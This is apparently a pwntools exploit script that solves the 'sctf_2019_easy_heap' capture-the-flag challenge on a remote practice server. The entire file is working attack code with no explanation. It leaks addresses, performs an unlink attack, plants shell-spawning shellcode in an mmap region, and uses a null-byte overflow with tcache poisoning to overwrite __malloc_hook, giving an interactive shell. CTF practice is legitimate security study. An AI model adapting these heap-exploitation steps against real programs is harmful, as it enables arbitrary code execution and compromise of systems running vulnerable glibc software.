from pwn import *

context(os = 'linux', arch = 'amd64', log_level = 'debug')
# io = process('sctf_2019_easy_heap')
io = remote('node4.buuoj.cn', 29687)
# libc = ELF('/home/payoung/Downloads/glibc-all-in-one/libs/2.27-3ubuntu1_amd64/libc-2.27.so')
libc = ELF('libc-2.27.so')
elf = ELF('sctf_2019_easy_heap')


def add(size):
    io.sendlineafter('>> ', '1')
    io.sendlineafter('Size: ', str(size))
    io.recvuntil(' Pointer Address ')
    return int(io.recvline()[:-1], 16)


def delete(index):
    io.sendlineafter('>> ', '2')
    io.sendlineafter('Index: ', str(index))


def edit(index, content):
    io.sendlineafter('>> ', '3')
    io.sendlineafter('Index: ', str(index))
    io.sendafter('Content: ', content)


def leak():
    global mmap_buf, elf_base
    io.recvuntil('Mmap: ')
    mmap_buf = int(io.recvline()[:-1], 16)
    log.success('mmap_buf :' + hex(mmap_buf))
    elf_base = add(0x28) - 0x202068             # index0
    log.success('elf_base :' + hex(elf_base))
    

def unlink():
    add(0x4f8)                                  # index1
    ptr0 = elf_base + 0x202068
    fd, bk = ptr0 - 0x18, ptr0 - 0x10
    payload = p64(0) + p64(0x21) + p64(fd) + p64(bk) + p64(0x20)
    edit(0, payload)
    delete(1)
    shellcode = asm(shellcraft.sh())
    payload = p64(0) * 2 + p64(len(shellcode)) + p64(mmap_buf)
    edit(0, payload + b'\n')
    edit(0, shellcode)


def overlap():
    add(0x418)                                  # index1
    add(0x18)                                   # index2
    add(0x4f8)                                  # index3
    add(0x18)                                   # index4
    # null-by-one to cause overlap
    delete(1)
    edit(2, b'2' * 0x10 + p64(0x440)) 
    delete(3)
    # two ptr point to same chunk
    add(0x418)                                  # index1
    add(0x18)                                   # index3 == index2
    add(0x4f8)                                  # index5 (old index3)
    # overlap again to change tcache(0x20) list
    delete(1)
    edit(2, b'2' * 0x10 + p64(0x440)) 
    delete(2)
    delete(5)
    # obtain unsorted_bin and partial write into __malloc_hook
    add(0x418)                                  # index1
    edit(3, b'\x30\n')
    add(0x18)                                   # index2
    add(0x18)                                   # index5
    edit(5, p64(mmap_buf) + b'\n')
    io.sendlineafter('>> ', '1')
    io.sendlineafter('Size: ', '1')
    # gdb.attach(io)
    # pause()
    io.interactive()


if __name__ == '__main__':
    leak()
    unlink()
    overlap()
